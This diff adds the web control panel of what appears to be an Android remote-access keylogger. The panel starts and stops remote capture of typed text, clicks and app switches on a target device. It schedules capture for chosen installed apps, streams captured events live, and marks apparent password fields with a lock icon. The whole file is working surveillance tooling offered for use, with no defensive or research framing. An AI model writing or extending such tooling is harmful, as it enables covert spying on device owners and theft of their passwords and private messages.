@@ -1,0 +1,1017 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keylogger - Remote Access</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background: #0a0e17;
+            color: #c8c8c8;
+            min-height: 100vh;
+        }
+
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 20px;
+            background: rgba(10, 14, 23, 0.95);
+            border-bottom: 1px solid rgba(0, 255, 65, 0.15);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .top-bar h1 {
+            font-size: 14px;
+            letter-spacing: 2px;
+            color: #00ff41;
+        }
+
+        .top-bar-actions {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .btn {
+            padding: 6px 16px;
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            background: rgba(0, 255, 65, 0.08);
+            color: #00ff41;
+            font-family: inherit;
+            font-size: 11px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s;
+            letter-spacing: 1px;
+        }
+
+        .btn:hover {
+            background: rgba(0, 255, 65, 0.2);
+        }
+
+        .btn-danger {
+            border-color: rgba(255, 60, 60, 0.3);
+            background: rgba(255, 60, 60, 0.08);
+            color: #ff4444;
+        }
+
+        .btn-danger:hover {
+            background: rgba(255, 60, 60, 0.2);
+        }
+
+        .btn-active {
+            background: rgba(0, 255, 65, 0.25);
+            box-shadow: 0 0 12px rgba(0, 255, 65, 0.3);
+        }
+
+        .btn-schedule {
+            border-color: rgba(0, 200, 255, 0.3);
+            background: rgba(0, 200, 255, 0.08);
+            color: #0cf;
+        }
+
+        .btn-schedule:hover {
+            background: rgba(0, 200, 255, 0.2);
+        }
+
+        .btn-schedule.has-apps {
+            background: rgba(0, 200, 255, 0.2);
+            box-shadow: 0 0 10px rgba(0, 200, 255, 0.2);
+        }
+
+        .btn-back {
+            text-decoration: none;
+            border-color: rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.04);
+            color: #888;
+        }
+
+        /* Stats */
+        .stats-row {
+            display: flex;
+            gap: 12px;
+            padding: 12px 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            flex-wrap: wrap;
+        }
+
+        .stat-card {
+            flex: 1;
+            min-width: 100px;
+            padding: 10px 14px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 6px;
+        }
+
+        .stat-label {
+            font-size: 9px;
+            color: #555;
+            letter-spacing: 1px;
+        }
+
+        .stat-value {
+            font-size: 18px;
+            color: #00ff41;
+            margin-top: 2px;
+        }
+
+        .stat-value.danger {
+            color: #ff4444;
+        }
+
+        .stat-value.warn {
+            color: #ffa500;
+        }
+
+        .stat-value.purple {
+            color: #c864ff;
+        }
+
+        .stat-value.cyan {
+            color: #0cf;
+        }
+
+        /* Filter & schedule row */
+        .filter-row {
+            display: flex;
+            gap: 8px;
+            padding: 8px 20px;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            flex-wrap: wrap;
+        }
+
+        .filter-row select,
+        .filter-row input[type="text"] {
+            padding: 5px 10px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            color: #c8c8c8;
+            font-family: inherit;
+            font-size: 11px;
+        }
+
+        .filter-row input:focus,
+        .filter-row select:focus {
+            outline: none;
+            border-color: rgba(0, 255, 65, 0.4);
+        }
+
+        .scheduled-badges {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+
+        .scheduled-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            padding: 3px 8px;
+            background: rgba(0, 200, 255, 0.1);
+            border: 1px solid rgba(0, 200, 255, 0.25);
+            border-radius: 10px;
+            font-size: 9px;
+            color: #0cf;
+        }
+
+        .scheduled-badge .remove-badge {
+            cursor: pointer;
+            color: #ff4444;
+            font-size: 10px;
+        }
+
+        .scheduled-badge .remove-badge:hover {
+            color: #ff6666;
+        }
+
+        /* Status */
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 10px;
+        }
+
+        .status-badge.active {
+            background: rgba(0, 255, 65, 0.15);
+            color: #00ff41;
+            border: 1px solid rgba(0, 255, 65, 0.3);
+        }
+
+        .status-badge.inactive {
+            background: rgba(255, 255, 255, 0.05);
+            color: #666;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .pulse-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #00ff41;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.4;
+                transform: scale(0.8);
+            }
+        }
+
+        /* Log feed */
+        .feed-container {
+            padding: 8px 20px;
+            max-height: calc(100vh - 260px);
+            overflow-y: auto;
+        }
+
+        .feed-container::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .feed-container::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .feed-container::-webkit-scrollbar-thumb {
+            background: rgba(0, 255, 65, 0.2);
+            border-radius: 2px;
+        }
+
+        .log-entry {
+            display: flex;
+            gap: 8px;
+            padding: 5px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            font-size: 11px;
+            animation: fadeIn 0.2s ease;
+            align-items: flex-start;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-4px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .log-time {
+            color: #444;
+            flex-shrink: 0;
+            min-width: 65px;
+            font-size: 10px;
+        }
+
+        .log-type {
+            flex-shrink: 0;
+            min-width: 80px;
+            padding: 1px 6px;
+            border-radius: 3px;
+            font-size: 9px;
+            text-align: center;
+            letter-spacing: 0.5px;
+            font-weight: bold;
+        }
+
+        .type-text_changed {
+            background: rgba(0, 255, 65, 0.15);
+            color: #00ff41;
+        }
+
+        .type-click {
+            background: rgba(0, 150, 255, 0.15);
+            color: #0096ff;
+        }
+
+        .type-long_click {
+            background: rgba(0, 100, 200, 0.2);
+            color: #0064c8;
+        }
+
+        .type-focus {
+            background: rgba(255, 165, 0, 0.15);
+            color: #ffa500;
+        }
+
+        .type-scroll {
+            background: rgba(170, 100, 255, 0.15);
+            color: #aa64ff;
+        }
+
+        .type-window_change {
+            background: rgba(0, 220, 255, 0.15);
+            color: #0cf;
+        }
+
+        .type-app_switch {
+            background: rgba(0, 220, 255, 0.25);
+            color: #0cf;
+            font-weight: bold;
+        }
+
+        .type-content_change {
+            background: rgba(255, 255, 100, 0.1);
+            color: #aa9900;
+        }
+
+        .type-selection {
+            background: rgba(255, 100, 200, 0.15);
+            color: #ff64c8;
+        }
+
+        .type-text_selection {
+            background: rgba(255, 150, 200, 0.15);
+            color: #ffaacc;
+        }
+
+        .type-notification {
+            background: rgba(255, 200, 0, 0.15);
+            color: #ffcc00;
+        }
+
+        .type-schedule_start {
+            background: rgba(0, 255, 100, 0.2);
+            color: #00ff65;
+        }
+
+        .type-schedule_stop {
+            background: rgba(255, 60, 60, 0.15);
+            color: #ff4444;
+        }
+
+        .type-announcement {
+            background: rgba(200, 200, 200, 0.1);
+            color: #888;
+        }
+
+        .type-other {
+            background: rgba(100, 100, 100, 0.1);
+            color: #666;
+        }
+
+        .log-app {
+            color: #0ff;
+            flex-shrink: 0;
+            min-width: 100px;
+            max-width: 140px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            font-size: 10px;
+        }
+
+        .log-text {
+            color: #ddd;
+            word-break: break-all;
+            flex: 1;
+            font-size: 11px;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #444;
+        }
+
+        .empty-state h2 {
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .empty-state p {
+            font-size: 11px;
+            color: #333;
+        }
+
+        /* Schedule Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 200;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-overlay.visible {
+            display: flex;
+        }
+
+        .modal {
+            background: #0e1320;
+            border: 1px solid rgba(0, 200, 255, 0.25);
+            border-radius: 8px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 80vh;
+            display: flex;
+            flex-direction: column;
+            animation: fadeIn 0.2s ease;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 18px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .modal-header h2 {
+            font-size: 13px;
+            letter-spacing: 1px;
+            color: #0cf;
+        }
+
+        .modal-close {
+            cursor: pointer;
+            color: #666;
+            font-size: 18px;
+            background: none;
+            border: none;
+        }
+
+        .modal-close:hover {
+            color: #fff;
+        }
+
+        .modal-search {
+            padding: 8px 18px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .modal-search input {
+            width: 100%;
+            padding: 8px 12px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            color: #c8c8c8;
+            font-family: inherit;
+            font-size: 11px;
+        }
+
+        .modal-search input:focus {
+            outline: none;
+            border-color: rgba(0, 200, 255, 0.4);
+        }
+
+        .modal-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px 0;
+        }
+
+        .modal-body::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .modal-body::-webkit-scrollbar-thumb {
+            background: rgba(0, 200, 255, 0.2);
+            border-radius: 2px;
+        }
+
+        .app-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 18px;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+
+        .app-item:hover {
+            background: rgba(0, 200, 255, 0.06);
+        }
+
+        .app-item.selected {
+            background: rgba(0, 200, 255, 0.1);
+        }
+
+        .app-item input[type="checkbox"] {
+            accent-color: #0cf;
+        }
+
+        .app-name {
+            color: #c8c8c8;
+            font-size: 11px;
+            flex: 1;
+        }
+
+        .app-pkg {
+            color: #555;
+            font-size: 9px;
+        }
+
+        .modal-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 18px;
+            border-top: 1px solid rgba(255, 255, 255, 0.06);
+            gap: 8px;
+        }
+
+        .modal-footer .selected-count {
+            font-size: 10px;
+            color: #0cf;
+        }
+
+        .modal-loading {
+            text-align: center;
+            padding: 40px;
+            color: #555;
+            font-size: 11px;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- TOP BAR -->
+    <div class="top-bar">
+        <h1>&#x2328; KEYLOGGER</h1>
+        <div class="top-bar-actions">
+            <span class="status-badge inactive" id="status-badge">
+                <span>STOPPED</span>
+            </span>
+            <button class="btn" id="btn-start" onclick="toggleCapture()">&#x25B6; START</button>
+            <button class="btn btn-schedule" id="btn-schedule" onclick="openScheduleModal()">&#x1F4C5; SCHEDULE</button>
+            <button class="btn btn-danger" id="btn-clear" onclick="clearLogs()">&#x1F5D1; CLEAR</button>
+            <a href="index.html" class="btn btn-back">&larr; BACK</a>
+        </div>
+    </div>
+
+    <!-- STATS -->
+    <div class="stats-row">
+        <div class="stat-card">
+            <div class="stat-label">TEXT EVENTS</div>
+            <div class="stat-value" id="stat-text">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-label">CLICKS</div>
+            <div class="stat-value cyan" id="stat-clicks">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-label">SCROLLS</div>
+            <div class="stat-value purple" id="stat-scrolls">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-label">UNIQUE APPS</div>
+            <div class="stat-value warn" id="stat-apps">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-label">TOTAL EVENTS</div>
+            <div class="stat-value" id="stat-total">0</div>
+        </div>
+    </div>
+
+    <!-- Scheduled apps row -->
+    <div class="filter-row" id="schedule-row" style="display:none;">
+        <span style="font-size:10px;color:#0cf;letter-spacing:1px;">SCHEDULED:</span>
+        <div class="scheduled-badges" id="scheduled-badges"></div>
+    </div>
+
+    <!-- FILTER ROW -->
+    <div class="filter-row">
+        <select id="filter-type" onchange="renderFeed()">
+            <option value="all">All Events</option>
+            <option value="text_changed">Text Changes</option>
+            <option value="click">Clicks</option>
+            <option value="scroll">Scrolls</option>
+            <option value="focus">Focus</option>
+            <option value="window_change">Window Changes</option>
+            <option value="app_switch">App Switches</option>
+            <option value="content_change">Content Changes</option>
+            <option value="selection">Selections</option>
+            <option value="long_click">Long Clicks</option>
+            <option value="notification">Notifications</option>
+        </select>
+        <input type="text" id="filter-text" placeholder="Search text..." oninput="renderFeed()">
+        <label style="font-size:10px;color:#555;display:flex;align-items:center;gap:4px;">
+            <input type="checkbox" id="auto-scroll" checked> Auto-scroll
+        </label>
+    </div>
+
+    <!-- FEED -->
+    <div class="feed-container" id="feed"></div>
+
+    <!-- SCHEDULE MODAL -->
+    <div class="modal-overlay" id="schedule-modal">
+        <div class="modal">
+            <div class="modal-header">
+                <h2>&#x1F4C5; SCHEDULE APPS</h2>
+                <button class="modal-close" onclick="closeScheduleModal()">&times;</button>
+            </div>
+            <div class="modal-search">
+                <input type="text" id="app-search" placeholder="Search apps..." oninput="filterApps()">
+            </div>
+            <div class="modal-body" id="app-list">
+                <div class="modal-loading">Loading installed apps...</div>
+            </div>
+            <div class="modal-footer">
+                <span class="selected-count" id="selected-count">0 selected</span>
+                <div style="display:flex;gap:8px;">
+                    <button class="btn btn-danger" onclick="clearSchedule()">CLEAR ALL</button>
+                    <button class="btn" onclick="saveSchedule()">&#x2714; SAVE</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/js/api.js"></script>
+    <script>
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        if (!deviceId) window.location.href = 'index.html';
+
+        let allEvents = [];
+        let isCapturing = false;
+        let wsConn = null;
+        let installedApps = [];
+        let scheduledApps = [];
+
+        // ===== LOAD CACHED EVENTS =====
+        async function loadCachedEvents() {
+            try {
+                const resp = await fetch('/api/device/' + deviceId + '/keylogs?limit=2000');
+                const json = await resp.json();
+                if (json.success && json.events && json.events.length > 0) {
+                    allEvents = json.events;
+                    updateStats();
+                    renderFeed();
+                }
+            } catch (e) { /* ignore */ }
+        }
+
+        // ===== TOGGLE CAPTURE =====
+        async function toggleCapture() {
+            const btn = document.getElementById('btn-start');
+            try {
+                if (!isCapturing) {
+                    const resp = await api.sendCommand(deviceId, 'keylog_start', {});
+                    if (resp) {
+                        isCapturing = true;
+                        btn.innerHTML = '&#x23F8; STOP';
+                        btn.classList.add('btn-active');
+                        updateStatusBadge(true);
+                    }
+                } else {
+                    const resp = await api.sendCommand(deviceId, 'keylog_stop', {});
+                    isCapturing = false;
+                    btn.innerHTML = '&#x25B6; START';
+                    btn.classList.remove('btn-active');
+                    updateStatusBadge(false);
+                }
+            } catch (err) {
+                alert('Error: ' + err.message);
+            }
+        }
+
+        function updateStatusBadge(active) {
+            const badge = document.getElementById('status-badge');
+            if (active) {
+                badge.className = 'status-badge active';
+                badge.innerHTML = '<span class="pulse-dot"></span><span>CAPTURING</span>';
+            } else {
+                badge.className = 'status-badge inactive';
+                badge.innerHTML = '<span>STOPPED</span>';
+            }
+        }
+
+        // ===== CLEAR LOGS =====
+        async function clearLogs() {
+            if (!confirm('Clear all keylog data for this device?')) return;
+            try {
+                await fetch('/api/device/' + deviceId + '/keylogs', { method: 'DELETE' });
+                allEvents = [];
+                updateStats();
+                renderFeed();
+            } catch (e) { /* ignore */ }
+        }
+
+        // ===== WEBSOCKET LIVE FEED =====
+        function connectWebSocket() {
+            const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            wsConn = new WebSocket(proto + '//' + location.host);
+
+            wsConn.onmessage = function (event) {
+                try {
+                    const data = JSON.parse(event.data);
+                    if (data.type === 'keylog_data' && data.deviceId === deviceId) {
+                        const events = data.events || [];
+                        events.forEach(function (ev) {
+                            allEvents.unshift(ev);
+                        });
+                        if (allEvents.length > 5000) allEvents = allEvents.slice(0, 5000);
+                        updateStats();
+                        renderFeed();
+                    }
+                } catch (e) { /* ignore */ }
+            };
+
+            wsConn.onclose = function () {
+                setTimeout(connectWebSocket, 3000);
+            };
+        }
+
+        // ===== UPDATE STATS =====
+        function updateStats() {
+            const textCount = allEvents.filter(e => e.type === 'text_changed').length;
+            const clickCount = allEvents.filter(e => e.type === 'click' || e.type === 'long_click').length;
+            const scrollCount = allEvents.filter(e => e.type === 'scroll').length;
+            const apps = new Set(allEvents.map(e => e.app).filter(Boolean));
+
+            document.getElementById('stat-text').textContent = textCount;
+            document.getElementById('stat-clicks').textContent = clickCount;
+            document.getElementById('stat-scrolls').textContent = scrollCount;
+            document.getElementById('stat-apps').textContent = apps.size;
+            document.getElementById('stat-total').textContent = allEvents.length;
+        }
+
+        // ===== RENDER FEED =====
+        function renderFeed() {
+            const container = document.getElementById('feed');
+            const typeFilter = document.getElementById('filter-type').value;
+            const textFilter = document.getElementById('filter-text').value.toLowerCase();
+
+            let filtered = allEvents;
+
+            if (typeFilter !== 'all') {
+                filtered = filtered.filter(e => e.type === typeFilter);
+            }
+            if (textFilter) {
+                filtered = filtered.filter(e =>
+                    (e.text || '').toLowerCase().includes(textFilter) ||
+                    (e.contentDesc || '').toLowerCase().includes(textFilter) ||
+                    (e.app || '').toLowerCase().includes(textFilter)
+                );
+            }
+
+            if (filtered.length === 0) {
+                container.innerHTML = '<div class="empty-state"><h2>No events captured</h2>' +
+                    '<p>Start capture to see raw events here. Every text change, click, scroll will appear.</p></div>';
+                return;
+            }
+
+            const display = filtered.slice(0, 1000);
+
+            let html = '';
+            display.forEach(function (ev) {
+                const time = ev.timestamp
+                    ? new Date(ev.timestamp).toLocaleTimeString()
+                    : (ev.receivedAt ? new Date(ev.receivedAt).toLocaleTimeString() : '--');
+
+                const appName = (ev.app || 'unknown').split('.').pop();
+                const evType = ev.type || 'other';
+                const typeClass = 'type-' + (evType.startsWith('other_') ? 'other' : evType);
+
+                let textDisplay = escapeHtml(ev.text || '');
+                const contentDesc = ev.contentDesc ? ' [' + escapeHtml(ev.contentDesc) + ']' : '';
+
+                if (evType === 'text_changed' && ev.beforeText) {
+                    textDisplay += ' <span style="color:#555;font-size:9px;">(was: "' + escapeHtml(ev.beforeText) + '")</span>';
+                }
+                if (evType === 'click' || evType === 'long_click') {
+                    const widget = ev.className ? ev.className.split('.').pop() : '';
+                    textDisplay = (textDisplay || contentDesc || widget || 'tap');
+                    if (widget && textDisplay !== widget) {
+                        textDisplay += ' <span style="color:#555;font-size:9px;">[' + escapeHtml(widget) + ']</span>';
+                    }
+                }
+                if (evType === 'scroll') {
+                    textDisplay = 'scrollY:' + (ev.scrollY || 0) + '/' + (ev.maxScrollY || 0);
+                    if (ev.itemCount) textDisplay += ' items:' + ev.itemCount;
+                }
+                if (evType === 'app_switch') {
+                    textDisplay = '<span style="font-weight:bold;">' + escapeHtml(ev.text || ev.appName || appName) + '</span>';
+                    if (ev.previousApp) textDisplay += ' <span style="color:#555;font-size:9px;">from ' + escapeHtml(ev.previousApp.split('.').pop()) + '</span>';
+                }
+
+                const hasDots = (ev.text || '').includes('\u2022') || (ev.text || '').includes('\u25CF');
+                if (hasDots) {
+                    textDisplay = '🔒 ' + textDisplay;
+                }
+
+                html += '<div class="log-entry">' +
+                    '<span class="log-time">' + time + '</span>' +
+                    '<span class="log-type ' + typeClass + '">' + evType.toUpperCase() + '</span>' +
+                    '<span class="log-app" title="' + escapeHtml(ev.app || '') + '">' + escapeHtml(appName) + '</span>' +
+                    '<span class="log-text">' + (textDisplay || contentDesc || '<span style="color:#333;">—</span>') + '</span>' +
+                    '</div>';
+            });
+
+            container.innerHTML = html;
+
+            if (document.getElementById('auto-scroll').checked) {
+                container.scrollTop = 0;
+            }
+        }
+
+        function escapeHtml(str) {
+            var div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        }
+
+        // ===== SCHEDULE MODAL =====
+        async function openScheduleModal() {
+            const modal = document.getElementById('schedule-modal');
+            modal.classList.add('visible');
+
+            const listEl = document.getElementById('app-list');
+            listEl.innerHTML = '<div class="modal-loading">Loading installed apps...</div>';
+
+            try {
+                const resp = await api.sendCommand(deviceId, 'apps_list', {});
+                if (resp && resp.data && resp.data.data) {
+                    installedApps = resp.data.data;
+                    installedApps.sort((a, b) => (a.name || '').localeCompare(b.name || ''));
+                } else {
+                    installedApps = [];
+                }
+
+                const schedResp = await api.sendCommand(deviceId, 'keylog_schedule_get', {});
+                if (schedResp && schedResp.data && schedResp.data.scheduledApps) {
+                    scheduledApps = schedResp.data.scheduledApps || [];
+                }
+
+                renderAppList();
+            } catch (e) {
+                listEl.innerHTML = '<div class="modal-loading" style="color:#ff4444;">Failed to load apps: ' + e.message + '</div>';
+            }
+        }
+
+        function closeScheduleModal() {
+            document.getElementById('schedule-modal').classList.remove('visible');
+            document.getElementById('app-search').value = '';
+        }
+
+        function renderAppList() {
+            const listEl = document.getElementById('app-list');
+            const search = (document.getElementById('app-search').value || '').toLowerCase();
+
+            let apps = installedApps;
+            if (search) {
+                apps = apps.filter(a =>
+                    (a.name || '').toLowerCase().includes(search) ||
+                    (a.package || a.packageName || '').toLowerCase().includes(search)
+                );
+            }
+
+            if (apps.length === 0) {
+                listEl.innerHTML = '<div class="modal-loading">No apps found</div>';
+                updateSelectedCount();
+                return;
+            }
+
+            let html = '';
+            apps.forEach(a => {
+                const pkg = a.package || a.packageName || '';
+                const name = a.name || pkg.split('.').pop();
+                const checked = scheduledApps.includes(pkg);
+                html += '<div class="app-item' + (checked ? ' selected' : '') + '" onclick="toggleApp(\'' + escapeHtml(pkg) + '\', this)">' +
+                    '<input type="checkbox" ' + (checked ? 'checked' : '') + ' onclick="event.stopPropagation(); toggleApp(\'' + escapeHtml(pkg) + '\', this.parentElement)">' +
+                    '<div style="flex:1"><div class="app-name">' + escapeHtml(name) + '</div>' +
+                    '<div class="app-pkg">' + escapeHtml(pkg) + '</div></div></div>';
+            });
+
+            listEl.innerHTML = html;
+            updateSelectedCount();
+        }
+
+        function filterApps() {
+            renderAppList();
+        }
+
+        function toggleApp(pkg, el) {
+            const idx = scheduledApps.indexOf(pkg);
+            if (idx >= 0) {
+                scheduledApps.splice(idx, 1);
+            } else {
+                scheduledApps.push(pkg);
+            }
+            const cb = el.querySelector('input[type="checkbox"]');
+            if (cb) cb.checked = scheduledApps.includes(pkg);
+            el.classList.toggle('selected', scheduledApps.includes(pkg));
+            updateSelectedCount();
+        }
+
+        function updateSelectedCount() {
+            document.getElementById('selected-count').textContent = scheduledApps.length + ' selected';
+        }
+
+        async function saveSchedule() {
+            try {
+                const resp = await api.sendCommand(deviceId, 'keylog_schedule_set', { apps: scheduledApps });
+                if (resp && resp.data) {
+                    scheduledApps = resp.data.scheduledApps || scheduledApps;
+                }
+                closeScheduleModal();
+                renderScheduledBadges();
+            } catch (e) {
+                alert('Failed to save schedule: ' + e.message);
+            }
+        }
+
+        async function clearSchedule() {
+            scheduledApps = [];
+            try {
+                await api.sendCommand(deviceId, 'keylog_schedule_set', { apps: [] });
+            } catch (e) { }
+            closeScheduleModal();
+            renderScheduledBadges();
+        }
+
+        function renderScheduledBadges() {
+            const row = document.getElementById('schedule-row');
+            const container = document.getElementById('scheduled-badges');
+            const schedBtn = document.getElementById('btn-schedule');
+
+            if (scheduledApps.length === 0) {
+                row.style.display = 'none';
+                schedBtn.classList.remove('has-apps');
+                return;
+            }
+
+            row.style.display = 'flex';
+            schedBtn.classList.add('has-apps');
+
+            let html = '';
+            scheduledApps.forEach(pkg => {
+                const name = pkg.split('.').pop();
+                html += '<span class="scheduled-badge">' + escapeHtml(name) +
+                    ' <span class="remove-badge" onclick="removeScheduledApp(\'' + escapeHtml(pkg) + '\')">&times;</span></span>';
+            });
+            container.innerHTML = html;
+        }
+
+        async function removeScheduledApp(pkg) {
+            scheduledApps = scheduledApps.filter(p => p !== pkg);
+            try {
+                await api.sendCommand(deviceId, 'keylog_schedule_set', { apps: scheduledApps });
+            } catch (e) { }
+            renderScheduledBadges();
+        }
+
+        // ===== CHECK STATUS ON LOAD =====
+        async function checkStatus() {
+            try {
+                const resp = await api.sendCommand(deviceId, 'keylog_status', {});
+                if (resp && resp.data) {
+                    if (resp.data.isCapturing) {
+                        isCapturing = true;
+                        document.getElementById('btn-start').innerHTML = '&#x23F8; STOP';
+                        document.getElementById('btn-start').classList.add('btn-active');
+                        updateStatusBadge(true);
+                    }
+                    if (resp.data.scheduledApps) {
+                        scheduledApps = resp.data.scheduledApps;
+                        renderScheduledBadges();
+                    }
+                }
+            } catch (e) { /* device offline */ }
+        }
+
+        // ===== INIT =====
+        loadCachedEvents();
+        checkStatus();
+        connectWebSocket();
+    </script>
+</body>
+
+</html>
